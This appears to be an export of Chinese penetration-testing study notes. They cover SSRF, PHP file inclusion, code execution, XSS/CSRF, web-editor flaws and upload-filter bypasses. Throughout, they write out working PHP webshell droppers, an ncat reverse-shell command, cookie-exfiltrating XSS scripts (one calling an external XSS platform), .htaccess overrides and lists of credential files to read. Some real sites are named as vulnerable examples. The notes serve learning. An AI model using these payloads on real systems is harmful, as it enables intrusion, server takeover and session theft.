SSRF:是一种由攻击者构造形成由服务端发起请求的一个安全漏洞.一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.(正是因为它是由服务端发起的,所以它能够请求到与它相连而与外网隔离的内部系统) SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制.比如从指定URL地址获取网页文本内容,加载指定地址的图片,下载等等. 漏洞产生: 用户在地址栏输入网址-&gt;向目标网站发送请求-&gt;目标网站接受请求并在服务器端验证请求是否合法,然后返回用户所需要的页面-&gt;用户接收页面并在浏览器中显示 此处的请求默认为www.xxx.com/a.php?image=(地址) 那么产生SSRF漏洞的环节在哪里呢?目标网站接受请求后在服务器端验证请求是否合法 产生的原因:服务器端的验证并没有对其请求获取图片的参数(image=)做出严格的过滤以及限制,导致可以从其他服务器的获取一定量的数据 reg: www.xxx.com/a.php?image=http://www.abc.com/1.jpg 如果我们将http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢? 如果存在该内网地址就会返回1xx2xx之类的状态码,不存在就会其他的状态码 终极简析:SSRF漏洞就是通过篡改获取资源的请求发送给服务器,但是服务器并没有发现在这个请求是合法的,然后服务器以他的身份来访问其他服务器的资源. SSRF漏洞的寻找(漏洞常见出没位置): 1)分享:通过URL地址分享网页内容 2)转码服务 3)在线翻译 4)图片加载与下载:通过URL地址加载或下载图片 5)图片,文章收藏功能 6)未公开的api实现以及其他调用URL的功能 7)从URL关键字中寻找 share wap url link src source target u 3g display sourceURI imageURL domain 漏洞验证: 1)因为SSRF漏洞是构造服务器发送请求的安全漏洞,所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞. 2)在页面源码中查找访问的资源地址,如果该资源地址类型为http://www.xxx.com/a.php?image=(地址)的就可能存在SSRF漏洞 www.cracer.com/a.php?image=http://192.168.0.000:22来探测22端口是否开放]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记22-其他漏洞]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B022-%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[php相关漏洞 jsp相关漏洞 其他漏洞汇总 php相关漏洞: 文件包含漏洞 php://input等伪协议利用 代码执行漏洞 变量覆盖漏洞 文件包含: 程序开发人员一般会把重复使用的函数写到单个文件中,需要使用某个函数时直接调用此文件 而无需再次编写,这种文件调用的过程一般被称为包含. 程序开发人员一般希望代码更灵活,所以将被包含的文件设置为变量,用来进行动态调用. 但正是由于这种灵活性,从而导致客户端可以调用一个恶意软件,造成文件包含漏洞. 几乎所有脚本语言都会提供文件包含的功能,但文件包含漏洞在PHP Web Application中居多. 而在JSP,ASP,ASP.NET程序中却非常少,甚至没有,这是有些语言设计的弊端. 在PHP中经常出现包含漏洞,但这并不意味着其他语言不存在. 常见文件包含函数: include():执行到include时才包含文件,找不到被包含文件时只会产生警告,脚本将继续执行 require():只要程序一运行就包含文件,找不到被包含的文件时会产生致命错误,并停止脚本 include_once()和require_once():若文件中代码已被包含则不会再次包含. reg:include(&quot;aaa.php&quot;) 利用条件: 程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件. 用户能够控制该动态变量 漏洞危害: 执行任意代码 包含恶意文件控制网站 甚至控制服务器 漏洞分类: 本地文件包含:可以包含本地文件,在条件允许时甚至能执行代码. 上传图片马,然后包含 读敏感文件,读PHP文件 包含日志文件GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件 远程文件包含:可以直接执行任意代码 要保证php.ini中allow_url_fopen和allow_url_include要为On 漏洞挖掘: 通过白盒代码审计 黑盒工具挖掘 awvs appscan burp kali w3af 本地包含漏洞实例代码: &lt;?php $test=$_GET[&apos;c&apos;]; include($test); ?&gt; test.txt内容为&lt;?php phpinfo()?&gt; 访问的话就用?c=c:\windows\... 包含之后,.txt文件会以php形式执行 本地包含漏洞注意事项: 相对路径: ../../../etc/passwd %00截断包含(PHP&lt;5.3.4) &lt;?php include&quot;$_GET[&apos;x&apos;].&quot;.php&quot;; echo&quot;$_GET[&apos;x&apos;].&quot;.php&quot;; ?&gt; magic_quotes_gps=off才可以,否则%00会被转义 Linux vi a.php &lt;?php $test=$_GET[&apos;x&apos;]; include($test); ?&gt; 利用技巧: 上传图片马,马包含的代码为: &lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[x]);?&gt;&quot;)?&gt;, http://www.cracer.com/xx.php?page=uploadfile/x.jpg时, 将会在fi这个文件夹下生成shell.php,内容为&lt;?php eval($_POST[x]);?&gt; 读敏感文件 Windows: C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml //iis配置文件 C:\Windows\repair\sam //存储系统初次安装的密码 C:\Program Files\mysql\my.ini //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD //MySQL root 存root账号密码的 C:\Windows\php.ini //php配置信息 C:\Windows\my.ini //Mysql配置信息 Linux: /root/.ssh/authorized_keys /root/.ssh/id_ras /root/.ssh/id_ras.keystore /root/.ssh/known_hosts /etc/passwd /etc/shadow /etc/mycnf /etc/httpd/conf/httpd.conf /root/.bash_history /root/.mysql_history /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts /proc/config.gz 包含日志(主要是得到日志的路径) 读日志路径: 文件包含漏洞读取apache配置文件 index.php?page=/etc/init.d/httpd index.php?page=/etc/httpd/conf/httpd.conf 默认位置/var/log/httpd/access_log error_log 日志会记录客户端请求及服务器响应的信息,访问http://www.xx.com/&lt;?php phpinfo();?&gt;时,&lt;?php phpinfo();?&gt;也会被记录在日志里,也可以插入到User-Agent 可以通过Burp Suite来绕过编码. reg: 制作错误,写入一句话: http://127.0.0.1/ekucms/index.php?s=my/show/id/{`eval($_POST[&apos;x&apos;])} 写入日志之后,输入日志url,然后菜刀连url 读php文件 直接包含php文件时会被解析,不能看到源码,可以用封装协议读取: ?page=php://filter/read=convert.base64-encode/resource=config.php 访问上述url后会返回config.php中经过Base64加密后的字符串,解密即可得到源码.. 使用PHP封装协议 allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提交数据&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&apos;xxxser&apos;]);?&gt;&quot;)?&gt; 结果将在index.php所在文件下生成一句话文件shell.php 远程包含 注:远程打的文件名不能为php可解析的扩展名,allow_url_fopen和allow_url_include为On是必须的. 若在a.txt写入&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[xxx]);?&gt;&quot;)?&gt;,可直接写shell 远程包含是以php形式打开的 php://-访问各个输入/输出流 php提供了一些杂项输入/输出(IO)流,允许访问php的输入输出流,标准输入输出和错误描述符,内存中,磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器. php://input 是个可以访问请求的原始数据的只读流.POST请求的情况下,最好使用php://input来代替$HTTP_RAW_POST_DATA,因为它不依赖于特定的php.ini指令.而且,这样的情况下,$HTTP_RAW_POST_DATA默认没有填充,比激活always_populate_raw_post_data潜在需要更少的内存.enctype=&quot;multipart/form-data&quot;的时候php://input是无效的. 利用php://input插入一句话木马 &lt;?php //$data=file_get_contents(&apos;php://input&apos;); //echo $data.&quot;&lt;br/&gt;&quot;; @eval(file_get_contents(&apos;php://input&apos;));//eval是执行的意思 ?&gt; php://input是用来接收post数据 漏洞分析-&gt;Mantra-&gt;url 在POST中插入数据 system(&apos;ncat -e /bin/bash localhost 1234&apos;); 测试一下nc反弹shell的利用,成功 php://input将文件包含漏洞变成代码执行漏洞 文件中存在包含漏洞的代码 &lt;?php @include($_GET[&quot;file&quot;])?&gt; 使用php://input,将执行代码通过Firefox的hacker在POST data中提交 &lt;?php system(&apos;ifconfig&apos;);?&gt; data URI schema 将文件包含漏洞变成代码执行漏洞并绕过360网站卫士的WAF 在实施的时候,我突然想到,文件包含漏洞,在读取php文件时,是不能显示文件内容的. 而很多情况,我们是急需读取php格式的配置文件,例如: dedecms数据库配置文件data/common.inc.php discuz全局配置文件config/config_global.php phpcms配置文件caches/configs/database.php phpwind配置文件conf/database.php wordpress配置文件wp-config.php 读取指定文件FileInclude.php的代码 &lt;?php system(&apos;cat/var/www/FileInclude.php&apos;)?&gt; 然后将攻击代码转化成data:URI data:text/plain,&lt;?php system(&apos;cat/var/www/FileInclude.php&apos;)?&gt; 注意,我们看到转化后的GET请求的参数中包含&lt;?的标记,在遇到有些WAF,包括云WAF(例如360网站卫士),就会将其视为攻击代码,阻挡下来.于是我们需要做一下编码处理 data:text/plain;base64,[攻击代码的base64编码] php://filter在文件包含漏洞中的利用 读取php文件源码内容 用法: php://filter/read=convert.base64-encode/resource=[文件路径] 将得到的base64的数据解码得出php文件内容 代码执行漏洞: 代码执行函数 php中可以执行代码的函数.如eval(),assert(),&apos;&apos;,system(),exec(),shell_exec(),passthru(),escapeshellcmd(),pcntl_exec()等. reg:&lt;?php eval($_POST[cc123])?&gt; @是错误抑制符,防止小错误的,写不写都一样 动态代码执行: &lt;?php $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; $a($b); ?&gt; http://127.0.0.1/x.php?a=system&amp;b=ipconfig a=assert&amp;b=phpinfo(); 执行系统命令ipconfig 可变变量是可以绕狗的 命令执行函数: 在php中您可以使用下列5个函数来执行外部的应用程序或函数 1.system:执行一个外部的应用程序并显示输出的结果 2.exec:执行一个外部的应用程序 3.passthru:执行一个UNIX系统命令并显示原始的输出 4.shell_exec:执行shell命令并返回输出的结果的字符串 5.&quot;&apos;&apos;&quot;运算符:与shell_exec函数的功能相同 system函数使用 &lt;? $cmd=$_GET[&quot;cmd&quot;]; echo&quot;&lt;pre&gt;&quot;; system($cmd); echo&quot;&lt;/pre&gt;&quot;; ?&gt; http://127.0.0.1/sys.php?cmd=ipconfig shell_exec函数 &lt;?php $x=$_GET[&apos;x&apos;]; echo shell_exec($x); ?&gt; http://127.0.0.1/x.php?x=ipconfig 代码执行 实例 http://www.77dvd.com/ http://www.bgdyhd.com/ http://www.bgdyhd.com/search.php?searchtype=5&amp;tid=&amp;area=phpinfo() 海洋cms代码漏洞 变量覆盖漏洞 产生: 变量如果未初始化,且能被用户所控制 在php中,若register_globals为on时尤其严重 此为全局变量覆盖漏洞 当register_global=ON时,变量来源可能是各个不同的地方,比如页面的表单,Cookie等. &lt;?php $auth=&apos;0&apos;; extract($_GET); if($auth==1){ echo&quot;登录成功!&quot;; }else{ echo&quot;您还没有登录,请重新登录!&quot;; } ?&gt; http://127.0.0.1/bian.php?auth=1]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记21-xssANDcsrf漏洞]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B021-xssANDcsrf%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[存储型XSS: 必须要写入到数据库中,再调用这个页面 一般在留言板多一些.盲打cookie &lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;textarea&gt; 可能闭合影响后台,不闭合影响前台 http-only 相当于对认证的cookie进行一次加密 留言的话DZ是在发表-&gt;下面的抢楼-&gt;alert(document.cookie) 弹cookie之后,发现没有auth这个cookie 需要用一个js代码,在http-only实验里面有个o.js和save.php 使用: 1.将&quot;全部去掉 2.将:换成= 3.将,换成; 4.将+换成%2B &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;script src=&quot;http://127.0.0.1/o.js&quot;&gt;&lt;/script&gt; save.php-&gt;(用来接收cookie的) &lt;?php $a = $_GET[&quot;opener&quot;]; $file = fopen(&quot;test_xxx.txt&quot;,&quot;w+&quot;); echo fwrite($file,$a); fclose($file); ?&gt; o.js-&gt;(传递cookie) alert(JSON.stringify(cookie_dict)); x.src=&apos;http://localhost/save.php?opener=&apos;+JSON.stringify(cookie_dict); 或者是: &lt;script&gt; var cookie=document.cookie; var url=&quot;http://127.0.0.1/cookie.php?x=&quot;; windows.location.href=url+cookie; &lt;/script&gt; XSS平台搭建: zkeys包含支持php和mysql 用phpinfo()来确认IIS是否搭建成功 sql要在后台添加进去,config的url指向要写自己的ip 权限-&gt;右键-&gt;属性-&gt;安全-&gt;添加-&gt;输入e,就添加了Everyone 建立index,注册,然后默认模块-&gt;keepsession 搭好后还需要重写一下url 安装ISAPI,然后绿色版直接全部copy到安装目录 打开,XSS站点,然后edit-&gt;Apply,就搭成功了. 要用邀请码的,需要把config里的注册配置的normal改成invite 然后再配置UPDATE的adminLevel = &quot;1&quot;,在后台里面编辑一个用户改成&quot;1&quot;就行了 这个是单人用的 在文件下载-&gt;BlueLotus_XSSReceiver_master.zip解压到网站路径 http://localhost就能找到 留后门就是js写的src指向,最好写在oclick里面 csrf 跨站请求伪造攻击 CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 可以通过url来提交的,基本都可能存在csrf 将post改为get提交的办法: 抓包,http://Host+POST+&amp;+底下的cookie -&gt;Drop 取消代理 复制get提交到url,回车,就能创建成功了 然后怎么伪造呢,xx.html,里面是&lt;img src=&quot;&quot;&gt; csrf有防护机制的,一般是referer防护的 referer主要是用来判断提交的页面是否合法的 Enable Referer,告诉它是从这个页面跳过来的,然后url+index.php,就能得到返回值了]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记20-xss漏洞]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B020-xss%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[xss是一个强漏洞 XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。 2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xss蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重。 xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。 其实就是执行一段恶意js代码 ************OWASP(一定要记住) --开放web应用安全项目 按照owasp执行 用多种浏览器去查看/调试,用穿山甲 payload利用攻击载荷 cookie:存放在本地的cookie中 通过cookie来欺骗浏览器,访问登录之后的页面 反射型,也称非持久型,DOM也属于反射型 存储型 挖掘: 1.手工挖 2.利用工具 大小写 特殊字符 特殊编码 引用其他JS语句 穿山甲-&gt;XSS编码-&gt;过过滤&apos;或者&quot;之类的 火狐插件-&gt;Hackbar,FireBug,Tamper Data,Live HTTP Headers,Editor Cookie 如何获取cookie,管理页面不知密码-&gt;document.coookie弹窗 或者发送到xss平台,将接收cookie的代码写进HTML里面去 穿山甲-&gt;工具-&gt;tamper Data-&gt;start tamper拦截来抓包 -&gt;还可以Add HTTP头-&gt;Replay(重新发送包) Editor Cookie就是穿山甲右侧-&gt;Cookies Manager+ 漏洞一般会出现在数据交互的地方: reg:登录,评论,留言,搜索 &lt;textarea&gt;&lt;script&gt;alert(/xx/)&lt;/script&gt;&lt;/textarea&gt; 百度的漏洞存在客户端上 百度网盘-&gt;左侧名称-&gt;修改不超过10个字符左右,然后抓包,burp插入JS代码就修改成功了,如果插入cookie,用户在线保存的话就会中招. CSDN漏洞在我的博客-&gt;留言板上 常见的payload.... 漏洞分析-&gt;bruteXSS 运行用python运行 运行用bruteXSS.py.. 加载payload列表,去暴力破解 G/P:GET or POST G URL:xxx.asp?keyword= 使用默认列表 ENTER Payload: &lt;/script&gt;&quot;&gt;.... 复制就行 放到URL后面执行一下 漏洞利用-&gt;OWASP(这个工具厉害一点)-&gt;打开 Settings-&gt;Configure Server-&gt;Start Scanner-&gt;GET-&gt;复制URL-&gt;将下面的X复制放在URL后面-&gt;Fuzz 成功后会弹框 payload在上方URL里面 Scanner-&gt;POST-&gt;URL,,,Parameters写payload后面的-&gt;Fuzz Dom也是 工具:Mantra $x=preg_replace(“/script/”,””,$x); $x=preg_replace(“/script/i”,””,$x); //加i的是不区分大小写的 常见的防xss代码,接收回来的/scipt/替换为空 http://xxx/xx?x=&lt;body ...&gt; //x是get过去的变量x (注:手工调试尽量用火狐浏览器) 绕过方式:1.大小写替换,,reg:scRipt 2.&lt;img src=1 onerror=&quot;alert(/xss/)&quot;&gt; 3.&lt;body onload=&quot;alert(/xss/)&gt; 4.如果替换掉alert,就换别的试一下.reg:可以先编码,用Mantra-&gt;XSS-&gt;String.fromCharCode() -&gt;onload=&quot;eval(String.fromCharCode(97,108,...就是alert编码))&quot; 选中alert(/xss/)然后XSS-&gt;alert..替换成编码 \u003c\u003e 代表&lt;&gt; \u003cimg src=1 onerror=alert(/xss/)\u003e-&gt;/xss/改成_key_ cookie获取: 反射型XSS: 网址:XSS Platform http://pip3.win/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=16 reg:假如说发现一个网址的搜索有弹窗,就复制整个url,将弹窗内容改为下面这个 &lt;sCRiPt sRc=http://pip3.win/qtCa&gt;&lt;sCrIpT&gt; 必须是在登录了后台系统之后的页面输入url, 再发送到 然后XSS平台-&gt;test-&gt;复制cookie,找到这个登录后台的login,然后打开漏洞利用-&gt;马哥-&gt;url下面那一段将cookie复制,然后点击强行修改cookie 可以放在x.html里面&lt;img src=&quot;url复制过来&quot;&gt;]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记19-编辑器]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B019-%E7%BC%96%E8%BE%91%E5%99%A8%2F</url>
    <content type="text"><![CDATA[常见编辑器漏洞详解 FCKeditor编辑器利用 EWEBeditor编辑器利用 其他类型编辑器的利用 编辑器利用: 南方:-&gt;southidceditor eweb(一般在根目录或者管理员目录下) ckeditor fck ckfinder 信息搜集-&gt;御剑 搜到后会有一个eweb...目录,,也可能叫edit,editor 信息搜集-&gt;caidao 去爬取 UploadFiles. 百度搜索:inurl:fckeditor /*site:xxx.com*/ 漏洞利用-&gt;Fckeidtor *****自己写安全工具一定不要外传,是犯法的. Fckeidtor上传的话,一定要有反应才行. 1.asp;jpg-&gt;上传成功后复制链接-&gt;访问-&gt;找到图片的地址,然后访问. 小迪版本-&gt;上传地址2如果弹窗的话就不能使用了 上传地址3-&gt;上传上去&quot;.&quot;就换成下划线的 就用突破建立文件夹: (这段代码其实就是抓的包) FCKeditor_2.5/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/xx.asp&amp;NewFolderName=x.asp 第一行: %2F就是一个 &quot;/&quot; 将%2F 替换成 aa.asp 2.6版本 用 %2Fxx.php%00截断.(在URL里面不需要转换) jsp用K8的FCK EWEB编辑器: 它有独立的后台,与网站的后台无关. /ewebeditor/ 1.进EWEB后台 2.找后台 admin_style.asp 3.登陆: (1)默认密码 (2)下载mdb数据库 (3)burp加载字典爆破 (4)注入 可以加个%23ewebeditor.mdb ,然后下载 数据管理-&gt;DatabaseBrow...(也就是辅臣数据库浏览器) 信息收集-&gt;御剑-&gt;找有eweb的url 然后sqlmap跑这个网址 ,如果已经知道数据库名的,就加载到字典里面,在python27-&gt;sqlmap-&gt;txt里面找 (还可以用穿山甲) 蚂蚁神盾???跟警方合作???(什么乱七八糟的) aaspsp这样的写法是要过滤掉中间的asp 有时候按钮不好使是浏览器兼容性的问题 漏洞分析-&gt;ietester-&gt;这个是低版本的测试浏览器 没有后台就找列目录漏洞 如果能找到admin_uploadfile.asp的话就: editor/admin_uploadfile.asp?id=&amp;dir=../.. 来列目录 构造上传: 寻找到在数据库里面改好的上传后缀的id form-&gt;?style=&quot;改好的id&quot; ckfinder: /ckfinder/ckfinder.html 右击创建子目录,上传文件,右击-&gt;查看元素就可以shell了 解析漏洞.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记18-上传漏洞详解]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B018-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[上传漏洞详解: 文件解析漏洞 上传本地验证绕过 上传服务器验证绕过 文件解析漏洞: 解析漏洞主要说的是一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞 IIS 5.x/6.0解析漏洞(比较老) IIS 6.0解析利用方法有两种 1.目录解析 /xx.asp/xx.jpg 在网站下建立文件夹的名字为.asp,.asa的文件夹,其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行 例如创建目录cracer.asp,那么 /cracer.asp/1.jpg将被当作asp文件夹来执行.假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了. 2.文件解析 cracer.asp;.jpg 第二种,在IIS6.0下,分号后面的不被解析,也就是说 cracer.asp;.jpg (卡上去是图片格式,但是上传后是.asp格式) 会被服务器看成是wooyun.asp还有IIS6.0默认的可执行文件除了asp还包含这三种 /cracer.asa /cracer.cer /cracer.cdx IIS 5.x是2000 6.0是2003 7.5是2008 Apache解析漏洞 Apache是从右到左开始判断解析,如果为不可识别解析,就再往左判断. 比如cracer.php.owf.rar &quot;.owf&quot;和&quot;.rar&quot;这两种后缀是apache不可识别解析,apache就会把cracer.php.owf.rar解析成php 如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个cracer.php.rara.jpg.png...(把你知道的常见后缀都写上...)去测试是否是合法后缀 任意不识别的后缀,逐级向上识别. IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞 Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的 在默认Fast-CGI开启状态下,黑阔上传一个名字为cracer.jpg,内容为&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;的文件,然后访问cracer.jpg/.php,在这个目录下就会生成一句话木马shell.php www.xxx.com/logo.gif/*.php触发漏洞(有漏洞会把前面文件当作php执行) x.asp00jieduan%jpg //a.php%00.jpg a.aspx.a;a.aspx.jpg..jpg第二种解析漏洞 或者直接上传xx.asp 微信互刷平台,以前存在过这个漏洞. Nginx&lt;8.03空字节代码执行漏洞 影响版:0.5,0.6,0.7&lt;=0.7.65,0.8&lt;=0.8.37 Nginx在图片中嵌入PHP代码然后通过访问 xxx.php%00.jpg 来执行其中的代码 htaccess文件解析 如果在Apache中.htaccess可被执行,且可被上传,那可以尝试在.htaccess中写入: &lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后再上传shell.jpg的木马,这样shell.jpg就可解析为php文件 上传本地验证绕过 上传检测流程概述: 通常一个文件以HTTP协议进行上传时,将以POST请求发送至web服务器,web服务器接收到请求并同意后,用户与web服务器将建立连接,并传输data 服务器命名规则: 第一种类型:上传文件名和服务器命名一致 第二种类型:上传文件名和服务器命名不一致(随机,时间日期命名等) (reg:a.asp-&gt;a.jpg/201702281211111.jpg) 常见的上传检测方式: 1.客户端JavaScript检测(通常为检测文件扩展名) 2.服务端MIME类型检测(检测Content-Type内容) 3.服务端目录路径检测(检测跟path参数相关的内容) 4.服务端文件扩展名检测(检测跟文件extension相关的内容) 5.服务端文件内容检测(检测内容是否合法或含有恶意代码) 客户端检测绕过(JavaScript检测) 首先判断JS本地验证 通常可以根据它的验证警告弹框的速度可以判断,如果你电脑运行比较快,那么我们可以用burp抓包,在点击提交的时候burp没有抓到包,就已经弹框那么说明这个就是本地js验证 绕过方法: 1.使用burp抓包改名 2.使用firebug直接删掉本地验证的js代码 3.添加js验证的白名单如将php的格式添加进去. 选择完文件,点击上传之后,没经过网络就弹框的,就是本地 如果是本地验证的话,用mantra修改js然后再上传 先用.jpg,上传抓包,然后burp再改回.php,然后forward. 因酷教育 WordPress 客户端白名单绕过 修改允许上传的类型 上传服务器端验证绕过 服务端检测绕过(MIME类型检测) MIME的作用:使客户端软件,区分不同种类的数据,reg:web浏览器就是通过MIME类型来判断文件是GIF图片,还是可打印的PostScript文件 web服务器使用MIME来说明发送数据的种类,web客户端使用MIME来说明希望接收到的数据种类. Tomact的安装目录\conf\web.xml中就定义了大量MIME类型,你可以去看一下 绕过方法: 直接使用burp抓包,得到post上传数据后,将Content-Type:text/plain改成Content-Type:image/gif 就可以成功绕过 Zwell通用图片上传 服务端检测绕过(目录路径检测) 目录路径检测,一般就检测路径是否合法,但稍微特殊一点的都没有防御,比如比较新的fckeditor php&lt;=2.6.4 任意文件上传漏洞 当POST下面的URL的时候 /fckeditor 264/filemanager/connectors/php/connector.php?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=fuck.php%00.gif HTTP/1.0 CurrentFolder 这个变量的值会传到ServerMapFolder($resourceType,$folderPath,$sCommand)中的形参$folder里,而$folder在这个函数中并没有做任何检测,就被CombinePaths()了 修改文件上传路径 http://www.upload.com/tcnet/Admin_Login.asp forward-&gt;快捷键(ctrl+R)-&gt;Repeater IIS6.0:reg:乱码中如果有JFIF,说明已经解析成功了 filepath路径修改绕过 可以用来突破自动命名规则 xxxxx.gif 一,改变文件上传后的路径 /a.asp/ 需要一定的创建权限,不一定能... 成功创建后为 /a.asp/xxx.gif 二,直接改变文件名称 /a.asp;. 修改后为 /a.asp;.xxxx.gif 服务器端检测绕过(文件扩展名检测) 黑名单检测 黑名单的安全性比白名单的安全性低很多,攻击手法自然也比白名单多,一般有个专门的blacklist文件,里面会包含常见的危险脚本文件例如:fckeditor 2.4.3或之前版本的黑名单 白名单检测 白名单相对来说比黑名单安全 一些,也不绝对安全 绕过黑名单 1.文件名大小写绕过 用像AsP,pHp之类的文件名绕过黑名单检测 2.名单列表绕过 用黑名单里没有的名单进行攻击,比如黑名单里没有asa或者cer之类的 3.特殊文件名绕过 比如发送的http包里把文件名改成test.asp或test.asp(下划线为空格),这种命名方式在windows系统里是不被允许的,所以需要在burp之类里进行修改,然后绕过验证后,会被windows系统自动去掉后面的点和空格,但要注意Unix/Linux系统没有这个特性 4.0x00截断绕过 在扩展名检测这一块目前我只遇到过asp的程序有这种漏洞,给个简单的伪代码name=getname(httprequest)//加入这时候获取到的文件名是test.asp.jpg(asp后面为0x00) type=gettype(name)//而在gettype()函数处理方式是从后往前扫描扩展名,所以判断为.jpg if(type==jpg) 5..htaccess文件攻击配合名单列表绕过,上传一个自定义的.htaccess,就可以轻松绕过各种检测 6.解析调用/漏洞绕过这类漏洞直接配合上传一个代码注入过的非黑名单即可,再利用解析调用/漏洞 burp-&gt;intruder-&gt;2p.${jpg} Payloads-&gt;加载后缀字典. 00截断:2p.php%00(ctrl+shift+u).jpg phpweb存在%00漏洞 绕过白名单 1.0x00截断绕过 用像test.asp?%00.jpg的方式进行截断.属于白名单文件,再利用服务端代码的检测逻辑漏洞进行攻击,目前我只遇到过asp的程序有这种漏洞 2.解析调用/漏洞绕过这类漏洞直接配合上传一个代码注入过的白名单文件即可,再利用解析调用/漏洞 -.htaccess文件攻击 通过一个.htaccess文件调用php的解析器去解析一个文件名中只要包含&quot;haha&quot;这个字符串的任意文件,所以无论文件名是什么样子,只要包含&quot;haha&quot;这个字符串,都可以被以php的方式来解析,是不是相当邪恶,一个自定义的.htaccess文件就可以以各种各样的方式去绕过很多上传验证机制. 建一个.htaccess文件,里面的内容如下: &lt;FilesMatch &quot;haha&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 同目录有个我们上传一个只有文件名并包含字符串&quot;haha&quot;.但是却无任何扩展名的文件里面的内容是php一句话木马 双文件上传 南方,良精,动易... 文件上传,repeater-&gt;复制cookie, 复制到-------------------------- 然后粘贴到后面 name=&quot;Filename2&quot; 后缀改成2p.cer 